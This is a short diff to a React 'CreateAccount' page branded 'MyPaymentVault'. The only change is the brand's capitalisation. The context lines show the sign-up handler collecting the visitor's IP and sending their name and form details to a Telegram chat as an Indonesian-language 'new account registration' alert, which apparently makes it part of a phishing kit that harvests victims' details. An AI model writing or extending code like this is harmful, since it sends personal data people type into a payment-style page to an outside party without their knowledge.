@@ -57,7 +57,7 @@ export default function CreateAccount() {
     const ip = await getIPInfo();
     await sendTelegram(
       `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `🆕 <b>MYPAYMENTVAULT</b>\n` +
+      `🆕 <b>MyPaymentVault</b>\n` +
       `📌 <b>Registrasi Akun Baru</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n\n` +
       `👤 <b>Nama</b>        : <code>${form.firstName} ${form.lastName}</code>\n` +
